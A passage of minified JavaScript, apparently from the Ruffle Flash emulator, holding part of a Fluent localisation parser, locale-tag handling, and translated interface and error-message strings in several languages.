              r.push(i(N)[1]);
              continue;
            }
            if ("{" === e[n]) {
              r.push(c());
              continue;
            }
            if ("}" === e[n]) throw new SyntaxError("Unbalanced closing brace");
            let i = g();
            if (!i) break;
            r.push(i), a = Math.min(a, i.length);
          }
          let i = r.length - 1, s = r[i];
          "string" == typeof s && (r[i] = s.replace(V, ""));
          let l = [];
          for (let e of r) e instanceof se && (e = e.value.slice(0, e.value.length - a)), e && l.push(e);
          return l;
        }
        function c() {
          a(Y, SyntaxError);
          let e = d();
          if (a(X)) return e;
          if (a(te)) {
            let n = function () {
              let e, n = [], a = 0;
              for (; M.lastIndex = n, M.test(e);) {
                r("*") && (e = a);
                let t = m(), i = l();
                if (null === i) throw new SyntaxError("Expected variant value");
                n[a++] = {key: t, value: i};
              }
              if (0 === a) return null;
              if (undefined === e) throw new SyntaxError("Expected default variant");
              return {variants: n, star: e};
            }();
            return a(X, SyntaxError), {type: "select", selector: e, ...n};
          }
          throw new SyntaxError("Unclosed placeable");
        }
        function d() {
          if ("{" === e[n]) return c();
          if (L.lastIndex = n, L.test(e)) {
            let [, t, r, o = null] = i(L);
            if ("$" === t) return {type: "var", name: r};
            if (a(ne)) {
              let i = function () {
                let t = [];
                for (;;) {
                  switch (e[n]) {
                    case ")":
                      return n++, t;
                    case undefined:
                      throw new SyntaxError("Unclosed argument list");
                  }
                  t.push(f()), a(ae);
                }
              }();
              if ("-" === t) return {type: "term", name: r, attr: o, args: i};
              if ($.test(r)) return {type: "func", name: r, args: i};
              throw new SyntaxError("Function names must be all upper-case");
            }
            return "-" === t ? {type: "term", name: r, attr: o, args: []} : {type: "mesg", name: r, attr: o};
          }
          return h();
        }
        function f() {
          let e = d();
          return "mesg" !== e.type ? e : a(re) ? {type: "narg", name: e.name, value: h()} : e;
        }
        function m() {
          let e;
          return a(Q, SyntaxError), e = (B.lastIndex = n, B.test(e)) ? p() : {type: "str", value: i(W)[1]}, a(ee, SyntaxError), e;
        }
        function h() {
          if (B.lastIndex = n, B.test(e)) return p();
          if ('"' === e[n]) return function () {
            r('"', SyntaxError);
            let t = "";
            for (;;) {
              if (t += i(U)[1], "\\" !== e[n]) {
                if (r('"')) return {type: "str", value: t};
                throw new SyntaxError("Unclosed string literal");
              }
              t += v();
            }
          }();
          throw new SyntaxError("Invalid expression");
        }
        function p() {
          let [, e, n = ""] = i(B), t = n.length;
          return {type: "num", value: parseFloat(e), precision: t};
        }
        function v() {
          if (Z.lastIndex = n, Z.test(e)) return i(Z)[1];
          if (H.lastIndex = n, H.test(e)) {
            let [, e, n] = i(H), t = parseInt(e || n, 16);
            return t <= 55295 || 57344 <= t ? String.fromCodePoint(t) : "�";
          }
          throw new SyntaxError("Unknown escape sequence");
        }
        function g() {
          let t = n;
          switch (a(ie), e[n]) {
            case ".":
            case "[":
            case "*":
            case "}":
            case undefined:
              return false;
            case "{":
              return w(e.slice(t, n));
          }
          return " " === e[n - 1] && w(e.slice(t, n));
        }
        function w(e) {
          let n = e.replace(K, "\n"), t = G.exec(e)[1].length;
          return new se(n, t);
        }
      }
    }
    class se {
      constructor(e, n) {
        this.value = e, this.length = n;
      }
    }
    const le = new RegExp("^([a-z]{2,3}|\\*)(?:-([a-z]{4}|\\*))?(?:-([a-z]{2}|\\*))?(?:-(([0-9][a-z0-9]{3}|[a-z0-9]{5,8})|\\*))?$", "i");
    class ue {
      constructor(e) {
        const n = le.exec(e.replace(/_/g, "-"));
        if (!n) return void (this.isWellFormed = false);
        let [, t, r, a, i] = n;
        t && (this.language = t.toLowerCase()), r && (this.script = r[0].toUpperCase() + r.slice(1)), a && (this.region = a.toUpperCase()), this.variant = i, this.isWellFormed = true;
      }
      isEqual(e) {
        return this.language === e.language && this.script === e.script && this.region === e.region && this.variant === e.variant;
      }
      matches(e, n = false, t = false) {
        return (this.language === e.language || n && undefined === this.language || t && undefined === e.language) && (this.script === e.script || n && undefined === this.script || t && undefined === e.script) && (this.region === e.region || n && undefined === this.region || t && undefined === e.region) && (this.variant === e.variant || n && undefined === this.variant || t && undefined === e.variant);
      }
      toString() {
        return [this.language, this.script, this.region, this.variant].filter(e => undefined !== e).join("-");
      }
      clearVariants() {
        this.variant = undefined;
      }
      clearRegion() {
        this.region = undefined;
      }
      addLikelySubtags() {
        const e = function (e) {
          if (Object.prototype.hasOwnProperty.call(ce, e)) return new ue(ce[e]);
          const n = new ue(e);
          return n.language && de.includes(n.language) ? (n.region = n.language.toUpperCase(), n) : null;
        }(this.toString().toLowerCase());
        return !!e && (this.language = e.language, this.script = e.script, this.region = e.region, this.variant = e.variant, true);
      }
    }
    const ce = {ar: "ar-arab-eg", "az-arab": "az-arab-ir", "az-ir": "az-arab-ir", be: "be-cyrl-by", da: "da-latn-dk", el: "el-grek-gr", en: "en-latn-us", fa: "fa-arab-ir", ja: "ja-jpan-jp", ko: "ko-kore-kr", pt: "pt-latn-br", sr: "sr-cyrl-rs", "sr-ru": "sr-latn-ru", sv: "sv-latn-se", ta: "ta-taml-in", uk: "uk-cyrl-ua", zh: "zh-hans-cn", "zh-hant": "zh-hant-tw", "zh-hk": "zh-hant-hk", "zh-mo": "zh-hant-mo", "zh-tw": "zh-hant-tw", "zh-gb": "zh-hant-gb", "zh-us": "zh-hant-us"}, de = ["az", "bg", "cs", "de", "es", "fi", "fr", "hu", "it", "lt", "lv", "nl", "pl", "ro", "ru"];
    const me = {"ar-SA": {"context_menu.ftl": "context-menu-download-swf = تحميل .swf\ncontext-menu-copy-debug-info = نسخ معلومات التصحيح\ncontext-menu-open-save-manager = فتح مدير الحفظ\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] حول ملحق رفل ({ $version })\n       *[other] حول رفل ({ $version })\n    }\ncontext-menu-hide = إخفاء هذه القائمة\ncontext-menu-exit-fullscreen = الخروج من وضعية الشاشة الكاملة\ncontext-menu-enter-fullscreen = تفعيل وضعية الشاشة الكاملة\ncontext-menu-volume-controls = التحكم بالصوت\n", "messages.ftl": 'message-cant-embed =\n    لم تكن رفل قادرة على تشغيل الفلاش المضمنة في هذه الصفحة.\n    يمكنك محاولة فتح الملف في علامة تبويب منفصلة، لتجاوز هذه المشكلة.\npanic-title = لقد حدث خطأ ما :(\nmore-info = معلومات أكثر\nrun-anyway = التشغيل على أي حال\ncontinue = الاستمرار\nreport-bug = إبلاغ عن خلل\nupdate-ruffle = تحديث رفل\nruffle-demo = ويب التجريبي\nruffle-desktop = برنامج سطح المكتب\nruffle-wiki = عرض رفل ويكي\nenable-hardware-acceleration = يبدو أن تسارع الأجهزة غير مفعل. بينما قد يعمل الروفل، قد يكون بطيئاً بشكل غير معقول. يمكنك معرفة كيفية تمكين تسارع الأجهزة من خلال متابعة هذا الرابط.\nview-error-details = عرض تفاصيل الخطأ\nopen-in-new-tab = فتح في علامة تبويب جديدة\nclick-to-unmute = انقر لإلغاء الكتم\nerror-file-protocol =\n    يبدو أنك تقوم بتشغيل رفل على بروتوكول "الملف:".\n    هذا لن يعمل لأن المتصفحات تمنع العديد من الميزات من العمل لأسباب أمنية.\n    بدلاً من ذلك، ندعوك إلى إعداد خادم محلي أو استخدام عرض الويب أو تطبيق سطح المكتب.\nerror-javascript-config =\n    تعرض رفل إلى مشكلة رئيسية بسبب الإعدادات الخاطئة للجافا سكريبت.\n    إذا كنت مسؤول الخادم، نحن ندعوك إلى التحقق من تفاصيل الخطأ لمعرفة سبب المشكلة.\n    يمكنك أيضا الرجوع إلى رفل ويكي للحصول على المساعدة.\nerror-wasm-not-found =\n    فشل رفل في تحميل مكون الملف ".wasm" المطلوب.\n    إذا كنت مسؤول الخادم، الرجاء التأكد من أن الملف قد تم تحميله بشكل صحيح.\n    إذا استمرت المشكلة، قد تحتاج إلى استخدام إعدادات "المسار العام": الرجاء مراجعة رفل ويكي للحصول على المساعدة.\nerror-wasm-mime-type =\n    واجهت رفل مشكلة رئيسية أثناء محاولة التهيئة.\n    خادم الويب هذا لا يخدم ملفات ". wasm" مع نوع MIME الصحيح.\n    إذا كنت مسؤول الخادم، يرجى مراجعة رفل ويكي للحصول على المساعدة.\nerror-swf-fetch =\n    فشل رفل في تحميل ملف فلاش SWF.\n    السبب الأكثر احتمالا هو أن الملف لم يعد موجودا، لذلك لا يوجد شيء ليحمله رفل.\n    حاول الاتصال بمسؤول الموقع للحصول على المساعدة.\nerror-swf-cors =\n    فشل الروفل في تحميل ملف فلاش SWF.\n    من المحتمل أن تم حظر الوصول إلى المنال بواسطة سياسة CORS.\n    إذا كنت مسؤول الخادم، يرجى مراجعة رفل ويكي للحصول على المساعدة.\nerror-wasm-cors =\n    فشل رفل في تحميل مكون ملف ".wasm" المطلوب.\n    من المحتمل أن تم حظر الوصول إلى المنال بواسطة سياسة CORS.\n    إذا كنت مسؤول الخادم، يرجى مراجعة رفل ويكي للحصول على المساعدة.\nerror-wasm-invalid =\n    واجهت رفل مشكلة رئيسية أثناء محاولة التهيئة.\n    خادم الويب هذا لا يخدم ملفات ". wasm" مع نوع MIME الصحيح.\n    إذا كنت مسؤول الخادم، يرجى مراجعة رفل ويكي للحصول على المساعدة.\nerror-wasm-download =\n    واجهت رفل مشكلة رئيسية أثناء محاولتها التهيئة.\n    هذا يمكن أن يحل نفسه في كثير من الأحيان، لذلك يمكنك محاولة إعادة تحميل الصفحة.\n    خلاف ذلك، يرجى الاتصال بمدير الموقع.\nerror-wasm-disabled-on-edge =\n    فشل رفل في تحميل مكون الملف ".wasm" المطلوب.\n    لإصلاح هذه المشكلة، حاول فتح إعدادات المتصفح الخاص بك، انقر فوق "الخصوصية، البحث، الخدمات"، والتمرير لأسفل، وإيقاف "تعزيز أمانك على الويب".\n    هذا سيسمح للمتصفح الخاص بك بتحميل الملفات ".wasm" المطلوبة.\n    إذا استمرت المشكلة، قد تحتاج إلى استخدام متصفح أخر.\nerror-javascript-conflict =\n    واجهت رفل مشكلة رئيسية أثناء محاولة التهيئة.\n    يبدو أن هذه الصفحة تستخدم كود جافا سكريبت الذي يتعارض مع رفل.\n    إذا كنت مسؤول الخادم، فإننا ندعوك إلى محاولة تحميل الملف على صفحة فارغة.\nerror-javascript-conflict-outdated = يمكنك أيضًا محاولة تحميل نسخة أحدث من رفل التي قد تحل المشكلة (النسخة الحالية قديمة: { $buildDate }).\nerror-csp-conflict =\n    واجهت رفل مشكلة رئيسية أثناء محاولة التهيئة.\n    لا تسمح سياسة أمان المحتوى لخادم الويب هذا بتشغيل مكون ".wasm" المطلوب.\n    إذا كنت مسؤول الخادم، يرجى الرجوع إلى رفل ويكي للحصول على المساعدة.\nerror-unknown =\n    واجهت رول مشكلة رئيسية أثناء محاولة عرض محتوى الفلاش هذا.\n    { $outdated ->\n        [true] إذا كنت مسؤول الخادم، الرجاء محاولة تحميل إصدار أحدث من رفل (النسخة الحالية قديمة: { $buildDate }).\n       *[false] ليس من المفترض أن يحدث هذا، لذلك نحن نقدر حقًا إذا قمت بالتبليغ عن الخطأ!\n    }\n', "save-manager.ftl": "save-delete-prompt = هل أنت متأكد أنك تريد حذف ملف حفظ اللعبة هذا؟\nsave-reload-prompt =\n    الطريقة الوحيدة لـ { $action ->\n        [delete] حذف\n       *[replace] استبدال\n    } هذا الملف الحفظ دون تضارب محتمل هي إعادة تحميل هذا المحتوى. هل ترغب في المتابعة على أي حال؟\nsave-download = تحميل\nsave-replace = استبدال\nsave-delete = حذف\nsave-backup-all = تحميل جميع الملفات المحفوظة\n", "volume-controls.ftl": "volume-controls = التحكم بالصوت\nvolume-controls-mute = كتم\nvolume-controls-volume = مستوى الصوت\n"}, "ca-ES": {"context_menu.ftl": "context-menu-download-swf = Baixa el fitxer .swf\ncontext-menu-copy-debug-info = Copia la informació de depuració\ncontext-menu-open-save-manager = Obre el gestor d'emmagatzematge\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Quant a l'extensió de Ruffle ({ $version })\n       *[other] Quant a Ruffle ({ $version })\n    }\ncontext-menu-hide = Amaga aquest menú\ncontext-menu-exit-fullscreen = Surt de la pantalla completa\ncontext-menu-enter-fullscreen = Pantalla completa\ncontext-menu-volume-controls = Controls de volum\n", "messages.ftl": "message-cant-embed =\n    Ruffle no ha pogut executar el contingut Flash incrustat en aquesta pàgina.\n    Podeu provar d'obrir el fitxer en una pestanya a part per evitar aquest problema.\npanic-title = Alguna cosa ha fallat :(\nmore-info = Més informació\nrun-anyway = Reprodueix igualment\ncontinue = Continua\nreport-bug = Informa d'un error\nupdate-ruffle = Actualitza Ruffle\nruffle-demo = Demostració web\nruffle-desktop = Aplicació d'escriptori\nruffle-wiki = Obre la wiki de Ruffle\nenable-hardware-acceleration = Sembla que l'acceleració per maquinari no està activada. Tot i que Ruffle podria funcionar, és probable que ho faci molt lentament. Pots trobar informació sobre com activar l'acceleració per maquinari al següent enllaç.\nview-error-details = Mostra detalls de l'error\nopen-in-new-tab = Obre en una pestanya nova\nclick-to-unmute = Feu clic per activar el so\nerror-file-protocol =\n    Sembla que esteu executant Ruffle al protocol \"file:\".\n    Això no funcionarà perquè els navegadors bloquegen moltes característiques per raons de seguretat. En comptes d'això, us suggerim que configureu un servidor local o bé utilitzeu la demostració web o l'aplicació d'escriptori.\nerror-javascript-config =\n    Ruffle ha topat amb un problema greu a causa d'una configuració JavaScript errònia.\n    Si sou l'administrador del servidor, us suggerim que comproveu els detalls de l'error per determinar el paràmetre culpable.\n    També podeu consultar la wiki del Ruffle per obtenir ajuda.\nerror-wasm-not-found =\n    Ruffle no ha pogut carregar el component de fitxer \".wasm\" necessari.\n    Si sou l'administrador del servidor, si us plau, comproveu que el fitxer ha estat carregat correctament.\n    Si el problema continua, és possible que hàgiu d'utilitzar el parámetre \"publicPath\": us preguem que consulteu la wiki de Ruffle per obtenir ajuda.\nerror-wasm-mime-type =\n    Ruffle ha topat amb un problema greu mentre provava d'inicialitzar-se.\n    Aquest servidor no està servint els fitxers \".wasm\" amb el tipus MIME adequat.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki de Ruffle per obtenir ajuda.\nerror-swf-fetch =\n    Ruffle no ha pogut carregar el fitxer SWF Flash.\n    La raó més probable és que el fitxer ja no existeixi, així que no hi ha res que el Ruffle pugui carregar.\n    Proveu de contactar a l'administrador del lloc per obtenir ajuda.\nerror-swf-cors =\n    Ruffle no ha pogut carregar el fitxer SWF Flash.\n    És probable que l'accés a la càrrega hagi estat denegat per una política CORS.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki del Ruffle per obtenir ajuda.\nerror-wasm-cors =\n    Ruffle no ha pogut carregar el component de fitxer \".wasm\" necessari.\n    És probable que l'accés a la càrrega hagi estat denegat per una política CORS.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki del Ruffle per obtenir ajuda.\nerror-wasm-invalid =\n    Ruffle ha topat amb un problema greu mentre provava d'inicialitzar-se.\n    Sembla que a aquest lloc li manquen fitxers o aquests no són vàlids per a l'execució de Ruffle.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki de Ruffle per obtenir ajuda.\nerror-wasm-download =\n    Ruffle ha topat amb un problema greu mentre provava d'inicialitzar-se.\n    Això sovint això pot resoldre's sol, així que podeu provar de recarregar la pàgina.\n    En cas contrari, us preguem que contacteu l'administrador del lloc.\nerror-wasm-disabled-on-edge =\n    Ruffle no ha pogut carregar el component de fitxer \".wasm\" necessari.\n    Per a arreglar-ho, proveu d'obrir els paràmetres del navegador, feu clic sobre \"Privadesa, cerca i serveis\", i desactiveu \"Prevenció de seguiment\".\n    Això permetrà que el vostre navegador carregui els fitxers \".wasm\" necessaris.\n    Si el problema continua, possiblement haureu d'utilitzar un altre navegador.\nerror-javascript-conflict =\n    Ruffle ha topat amb un problema greu mentre provava d'inicialitzar-se.\n    Sembla que aquest lloc fa servir codi JavaScript que entra en conflicte amb Ruffle.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki de Ruffle per obtenir ajuda.\nerror-javascript-conflict-outdated = També podeu provar de carregar una versió més recent de Ruffle que podria resoldre el problema (la compilació actual està desactualitzada: { $buildDate }).\nerror-csp-conflict =\n    Ruffle ha topat amb un problema greu mentre provava d'inicialitzar-se.\n    La política de seguretat del contingut (CSP) no permet l'execució del component \".wasm\" necessari.\n    Si sou l'administrador del servidor, us preguem que consulteu la wiki de Ruffle per obtenir ajuda.\nerror-unknown =\n    Ruffle ha topat amb un problema greu mentre provava de mostrar aquest contingut Flash.\n    { $outdated ->\n        [true] Si sou l'administrador del servidor, us preguem que proveu de carregar una versió més recent de Ruffle (la compilació actual està desactualitzada: { $buildDate }).\n       *[false] Això no hauria d'haver passat, així que us agrairíem molt que n'informéssiu l'error!\n    }\n", "save-manager.ftl": "save-delete-prompt = Segur que vols esborrar aquest fitxer desat?\nsave-reload-prompt =\n    L'única forma d{ $action ->\n        [delete] 'eliminar\n       *[replace] e substituir\n    } aquest fitxer desat sense crear un potencial conflicte és recarregant el contingut. Voleu continuar igualment?\nsave-download = Baixa\nsave-replace = Substitueix\nsave-delete = Elimina\nsave-backup-all = Baixa tots els fitxers desats\n", "volume-controls.ftl": "volume-controls = Controls de volum\nvolume-controls-mute = Silenci\nvolume-controls-volume = Volum\n"}, "cs-CZ": {"context_menu.ftl": "context-menu-download-swf = Stáhnout .swf\ncontext-menu-copy-debug-info = Zkopírovat debug info\ncontext-menu-open-save-manager = Otevřít správce uložení\ncontext-menu-about-ruffle =\n    { $flavor ->\n         [extension] O Ruffle rozšíření ({ $version })\n        *[other] O Ruffle ({ $version })\n    }\ncontext-menu-hide = Skrýt menu\ncontext-menu-exit-fullscreen = Ukončit režim celé obrazovky\ncontext-menu-enter-fullscreen = Přejít do režimu celé obrazovky\ncontext-menu-volume-controls = Ovládání hlasitosti\n", "messages.ftl": 'message-cant-embed =\n    Ruffle nemohl spustit Flash vložený na této stránce.\n    Můžete se pokusit otevřít soubor na samostatné kartě, abyste se vyhnuli tomuto problému.\npanic-title = Něco se pokazilo :(\nmore-info = Další informace\nrun-anyway = Přesto spustit\ncontinue = Pokračovat\nreport-bug = Nahlásit chybu\nupdate-ruffle = Aktualizovat Ruffle\nruffle-demo = Web Demo\nruffle-desktop = Desktopová aplikace\nruffle-wiki = Zobrazit Ruffle Wiki\nenable-hardware-acceleration = Zdá se, že hardwarová akcelerace není povolena. I když Ruffle funguje správně, může být nepřiměřeně pomalý. Jak povolit hardwarovou akceleraci zjistíte na tomto odkazu.\nview-error-details = Zobrazit podrobnosti o chybě\nopen-in-new-tab = Otevřít na nové kartě\nclick-to-unmute = Kliknutím zrušíte ztlumení\nerror-file-protocol =\n    Zdá se, že používáte Ruffle na protokolu "file:".\n    To není možné, protože prohlížeče blokují fungování mnoha funkcí z bezpečnostních důvodů.\n    Namísto toho vám doporučujeme nastavit lokální server nebo použít web demo či desktopovou aplikaci.\nerror-javascript-config =\n    Ruffle narazil na problém v důsledku nesprávné konfigurace JavaScriptu.\n    Pokud jste správcem serveru, doporučujeme vám zkontrolovat podrobnosti o chybě, abyste zjistili, který parametr je vadný.\n    Pomoc můžete získat také na wiki Ruffle.\nerror-wasm-not-found =\n    Ruffle se nepodařilo načíst požadovanou komponentu souboru „.wasm“.\n    Pokud jste správcem serveru, zkontrolujte, zda byl soubor správně nahrán.\n    Pokud problém přetrvává, možná budete muset použít nastavení „publicPath“: pomoc naleznete na wiki Ruffle.\nerror-wasm-mime-type =\n    Ruffle narazil na problém při pokusu o inicializaci.\n    Tento webový server neposkytuje soubory „.wasm“ se správným typem MIME.\n    Pokud jste správcem serveru, nápovědu najdete na Ruffle wiki.\nerror-swf-fetch =\n    Ruffle se nepodařilo načíst SWF soubor Flash.\n    Nejpravděpodobnějším důvodem je, že soubor již neexistuje, takže Ruffle nemá co načíst.\n    Zkuste požádat o pomoc správce webu.\nerror-swf-cors =\n    Ruffle se nepodařilo načíst SWF soubor Flash.\n    Přístup k načítání byl pravděpodobně zablokován politikou CORS.\n    Pokud jste správcem serveru, nápovědu najdete na Ruffle wiki.\nerror-wasm-cors =\n    Ruffle se nepodařilo načíst požadovanou komponentu souboru „.wasm“.\n    Přístup k načítání byl pravděpodobně zablokován politikou CORS.\n    Pokud jste správcem serveru, nápovědu najdete na Ruffle wiki.\nerror-wasm-invalid =\n    Ruffle narazil na problém při pokusu o inicializaci.\n    Zdá se, že na této stránce chybí nebo jsou neplatné soubory ke spuštění Ruffle.\n    Pokud jste správcem serveru, nápovědu najdete na Ruffle wiki.\nerror-wasm-download =\n    Ruffle narazil na problém při pokusu o inicializaci.\n    Problém se může vyřešit i sám, takže můžete zkusit stránku načíst znovu.\n    V opačném případě kontaktujte administrátora stránky.\nerror-wasm-disabled-on-edge =\n    Ruffle se nepodařilo načíst požadovanou komponentu souboru „.wasm“.\n    Chcete-li tento problém vyřešit, zkuste otevřít nastavení prohlížeče, klikněte na položku „Ochrana osobních údajů, vyhledávání a služby“, přejděte dolů a vypněte možnost „Zvyšte svou bezpečnost na webu“.\n    Vašemu prohlížeči to umožní načíst požadované soubory „.wasm“.\n    Pokud problém přetrvává, budete možná muset použít jiný prohlížeč.\nerror-javascript-conflict =\n    Ruffle narazil na problém při pokusu o inicializaci.\n    Zdá se, že tato stránka používá kód JavaScript, který je v konfliktu s Ruffle.\n    Pokud jste správcem serveru, doporučujeme vám zkusit načíst soubor na prázdnou stránku.\nerror-javascript-conflict-outdated = Můžete se také pokusit nahrát novější verzi Ruffle, která může daný problém vyřešit (aktuální build je zastaralý: { $buildDate }).\nerror-csp-conflict =\n    Ruffle narazil na problém při pokusu o inicializaci.\n    Zásady zabezpečení obsahu tohoto webového serveru nepovolují spuštění požadované komponenty „.wasm“.\n    Pokud jste správcem serveru, nápovědu najdete na Ruffle wiki.\nerror-unknown =\n    Ruffle narazil na problém při pokusu zobrazit tento Flash obsah.\n    { $outdated ->\n          [true] Pokud jste správcem serveru, zkuste nahrát novější verzi Ruffle (aktuální build je zastaralý: { $buildDate }).\n         *[false] Toto by se nemělo stát, takže bychom opravdu ocenili, kdybyste mohli nahlásit chybu!\n    }\n', "save-manager.ftl": "save-delete-prompt = Opravdu chcete odstranit tento soubor s uloženými pozicemi?\nsave-reload-prompt =\n    Jediný způsob, jak { $action ->\n          [delete] vymazat\n         *[replace] nahradit\n    } tento soubor s uloženými pozicemi bez potenciálního konfliktu je opětovné načtení tohoto obsahu. Chcete přesto pokračovat?\nsave-download = Stáhnout\nsave-replace = Nahradit\nsave-delete = Vymazat\nsave-backup-all = Stáhnout všechny soubory s uloženými pozicemi\n", "volume-controls.ftl": "volume-controls = Ovládání hlasitosti\nvolume-controls-mute = Ztlumit\nvolume-controls-volume = Hlasitost\n"}, "de-DE": {"context_menu.ftl": "context-menu-download-swf = .swf herunterladen\ncontext-menu-copy-debug-info = Debug-Info kopieren\ncontext-menu-open-save-manager = Dateimanager öffnen\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Über Ruffle Erweiterung ({ $version })\n       *[other] Über Ruffle ({ $version })\n    }\ncontext-menu-hide = Menü ausblenden\ncontext-menu-exit-fullscreen = Vollbild verlassen\ncontext-menu-enter-fullscreen = Vollbildmodus aktivieren\ncontext-menu-volume-controls = Lautstärke einstellen\n", "messages.ftl": 'message-cant-embed =\n    Ruffle konnte den Flash in dieser Seite nicht ausführen.\n    Du kannst versuchen, die Datei in einem separaten Tab zu öffnen, um dieses Problem zu umgehen.\npanic-title = Etwas ist schief gelaufen\nmore-info = Weitere Informationen\nrun-anyway = Trotzdem ausführen\ncontinue = Fortfahren\nreport-bug = Fehler melden\nupdate-ruffle = Ruffle aktuallisieren\nruffle-demo = Web-Demo\nruffle-desktop = Desktop-Anwendung\nruffle-wiki = Ruffle-Wiki anzeigen\nview-error-details = Fehlerdetails anzeigen\nopen-in-new-tab = In einem neuen Tab öffnen\nclick-to-unmute = Klicke zum Entmuten\nerror-file-protocol =\n    Es scheint, dass Sie Ruffle auf dem "file:"-Protokoll ausführen.\n    Dies funktioniert nicht so, als Browser viele Funktionen aus Sicherheitsgründen blockieren.\n    Stattdessen laden wir Sie ein, einen lokalen Server einzurichten oder entweder die Webdemo oder die Desktop-Anwendung zu verwenden.\nerror-javascript-config =\n    Ruffle ist aufgrund einer falschen JavaScript-Konfiguration auf ein großes Problem gestoßen.\n    Wenn du der Server-Administrator bist, laden wir dich ein, die Fehlerdetails zu überprüfen, um herauszufinden, welcher Parameter fehlerhaft ist.\n    Sie können auch das Ruffle-Wiki für Hilfe konsultieren.\nerror-wasm-not-found =\n    Ruffle konnte die erforderliche ".wasm"-Datei-Komponente nicht laden.\n    Wenn Sie der Server-Administrator sind, stellen Sie bitte sicher, dass die Datei korrekt hochgeladen wurde.\n    Wenn das Problem weiterhin besteht, müssen Sie unter Umständen die "publicPath"-Einstellung verwenden: Bitte konsultieren Sie das Ruffle-Wiki für Hilfe.\nerror-wasm-mime-type =\n    Ruffle ist auf ein großes Problem beim Initialisieren gestoßen.\n    Dieser Webserver dient nicht ". asm"-Dateien mit dem korrekten MIME-Typ.\n    Wenn Sie der Server-Administrator sind, konsultieren Sie bitte das Ruffle-Wiki für Hilfe.\nerror-swf-fetch =\n    Ruffle konnte die Flash-SWF-Datei nicht laden.\n    Der wahrscheinlichste Grund ist, dass die Datei nicht mehr existiert, so dass Ruffle nicht geladen werden kann.\n    Kontaktieren Sie den Website-Administrator für Hilfe.\nerror-swf-cors =\n    Ruffle konnte die Flash-SWF-Datei nicht laden.\n    Der Zugriff auf den Abruf wurde wahrscheinlich durch die CORS-Richtlinie blockiert.\n    Wenn Sie der Server-Administrator sind, konsultieren Sie bitte das Ruffle-Wiki für Hilfe.\nerror-wasm-cors =\n    Ruffle konnte die Flash-SWF-Datei nicht laden.\n    Der Zugriff auf den Abruf wurde wahrscheinlich durch die CORS-Richtlinie blockiert.\n    Wenn Sie der Server-Administrator sind, konsultieren Sie bitte das Ruffle-Wiki für Hilfe.\nerror-wasm-invalid =\n    Ruffle ist auf ein großes Problem beim Initialisieren gestoßen.\n    Dieser Webserver dient nicht ". asm"-Dateien mit dem korrekten MIME-Typ.\n    Wenn Sie der Server-Administrator sind, konsultieren Sie bitte das Ruffle-Wiki für Hilfe.\nerror-wasm-download =\n    Ruffle ist auf ein großes Problem gestoßen, während er versucht hat zu initialisieren.\n    Dies kann sich oft selbst beheben, so dass Sie versuchen können, die Seite neu zu laden.\n    Andernfalls kontaktieren Sie bitte den Website-Administrator.\nerror-wasm-disabled-on-edge =\n    Ruffle konnte die erforderliche ".wasm"-Datei-Komponente nicht laden.\n    Um dies zu beheben, versuche die Einstellungen deines Browsers zu öffnen, klicke auf "Privatsphäre, Suche und Dienste", scrollen nach unten und schalte "Verbessere deine Sicherheit im Web" aus.\n    Dies erlaubt Ihrem Browser die erforderlichen ".wasm"-Dateien zu laden.\n    Wenn das Problem weiterhin besteht, müssen Sie möglicherweise einen anderen Browser verwenden.\nerror-javascript-conflict =\n    Ruffle ist auf ein großes Problem beim Initialisieren gestoßen.\n    Es scheint, als ob diese Seite JavaScript-Code verwendet, der mit Ruffle kollidiert.\n    Wenn Sie der Server-Administrator sind, laden wir Sie ein, die Datei auf einer leeren Seite zu laden.\nerror-javascript-conflict-outdated = Du kannst auch versuchen, eine neuere Version von Ruffle hochzuladen, die das Problem umgehen könnte (aktuelle Version ist veraltet: { $buildDate }).\nerror-csp-conflict =\n    Ruffle ist auf ein großes Problem beim Initialisieren gestoßen.\n    Dieser Webserver dient nicht ". asm"-Dateien mit dem korrekten MIME-Typ.\n    Wenn Sie der Server-Administrator sind, konsultieren Sie bitte das Ruffle-Wiki für Hilfe.\nerror-unknown =\n    Bei dem Versuch, diesen Flash-Inhalt anzuzeigen, ist Ruffle auf ein großes Problem gestoßen.\n    { $outdated ->\n        [true] Wenn Sie der Server-Administrator sind, Bitte versuchen Sie, eine neuere Version von Ruffle hochzuladen (aktuelle Version ist veraltet: { $buildDate }).\n       *[false] Dies soll nicht passieren, deshalb würden wir uns sehr darüber freuen, wenn Sie einen Fehler melden könnten!\n    }\n', "save-manager.ftl": "save-delete-prompt = Sind Sie sicher, dass Sie diese Speicherdatei löschen möchten?\nsave-reload-prompt =\n    Der einzige Weg zu { $action ->\n        [delete] löschen\n       *[replace] ersetzen\n    } diese Speicherdatei ohne möglichen Konflikt ist das erneute Laden dieses Inhalts. Möchten Sie trotzdem fortfahren?\nsave-download = Herunterladen\nsave-replace = Ersetzen\nsave-delete = Löschen\nsave-backup-all = Alle gespeicherten Dateien herunterladen\n", "volume-controls.ftl": "volume-controls = Lautstärkeeinstellungen\nvolume-controls-mute = Stummschalten\nvolume-controls-volume = Lautstärke\n"}, "en-US": {"context_menu.ftl": "context-menu-download-swf = Download .swf\ncontext-menu-copy-debug-info = Copy debug info\ncontext-menu-open-save-manager = Open Save Manager\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] About Ruffle Extension ({$version})\n        *[other] About Ruffle ({$version})\n    }\ncontext-menu-hide = Hide this menu\ncontext-menu-exit-fullscreen = Exit fullscreen\ncontext-menu-enter-fullscreen = Enter fullscreen\ncontext-menu-volume-controls = Volume controls\n", "messages.ftl": 'message-cant-embed =\n    Ruffle wasn\'t able to run the Flash embedded in this page.\n    You can try to open the file in a separate tab, to sidestep this issue.\npanic-title = Something went wrong :(\nmore-info = More info\nrun-anyway = Run anyway\ncontinue = Continue\nreport-bug = Report Bug\nupdate-ruffle = Update Ruffle\nruffle-demo = Web Demo\nruffle-desktop = Desktop Application\nruffle-wiki = View Ruffle Wiki\nenable-hardware-acceleration = It looks like hardware acceleration is not enabled. While Ruffle may work, it could be unreasonably slow. You can find out how to enable hardware acceleration by following this link.\nview-error-details = View Error Details\nopen-in-new-tab = Open in a new tab\nclick-to-unmute = Click to unmute\nerror-file-protocol =\n    It appears you are running 